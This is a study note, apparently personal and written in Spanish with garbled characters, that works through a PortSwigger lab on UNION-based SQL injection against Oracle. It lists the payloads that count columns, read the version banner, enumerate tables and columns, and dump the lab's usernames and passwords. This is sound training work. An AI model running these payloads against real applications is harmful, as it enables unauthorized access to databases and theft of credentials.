#labs #web #ejercicio

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as theÂ `administrator`Â user.

[ACCESS THE LAB](https://portswigger.net/academy/labs/launch/de4256d42cc604a2a3f7e792c5fff88df1712f1537cd506ed2537efedbd4c665?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-listing-database-contents-oracle)

---
## ðŸ“œ Notas
## NÃºmero de columnas
==' ORDER BY 2-- -

>Num  Columns = 2

Se envÃ­a un valor mÃ¡s alto que el nÃºmero real de columnas hasta que la consulta falla; asÃ­ descubrimos que la vista vulnerable devuelve **2 columnas** y podremos construir los `UNION SELECT` con el mismo tamaÃ±o.
## Banner completo
==' UNION SELECT banner, NULL FROM v$version-- -

>CORE 11.2.0.2.0 Production = NÃºcleo del motor RDBMS
>NLSRTL Version 11.2.0.2.0 - Production = LibrerÃ­a NLS (idiomas)
>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production = EdiciÃ³n y plataforma
>PL/SQL Release 11.2.0.2.0 - Production = Motor PL/SQL
>TNS for Linux: Version 11.2.0.2.0 - Production = Listener SQL*Net

El **banner** revela versiÃ³n exacta de Oracle (11.2.0.2 XE), parches y componentes activos (PL/SQL, NLS, listener). Sirve para:  
â€¢ Confirmar que estamos en Oracle â†’ usar diccionario `ALL_*`.  
â€¢ Conocer funciones disponibles y valorar exploits especÃ­ficos.
## Owners/schemas y tablas
==' UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES-- -

Se ven muchas tablas y filtramos por users

>USERS_MCVLHP
## Columnas de la tabla objetivo
==' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_MCVLHP'-- -

>EMAIL
>PASSWORD_KUJLZX
>USERNAME_IICTAW
## Datos
==' UNION SELECT USERNAME_IICTAW, PASSWORD_KUJLZX FROM USERS_MCVLHP-- -

>administrator = w56ut8rpy7fllglw96gm
>carlos = hs9si1fdhvtclytak44u
>wiener = xcdhy5ehe8us7169bu2o

---

> ðŸ’¬ *Pro tip:* cuando sÃ³lo dispones de 1 columna visible, puedes concatenar con CHR(10) para saltos de lÃ­nea:  
> `' UNION SELECT username||CHR(58)||password, NULL FROM ...`  
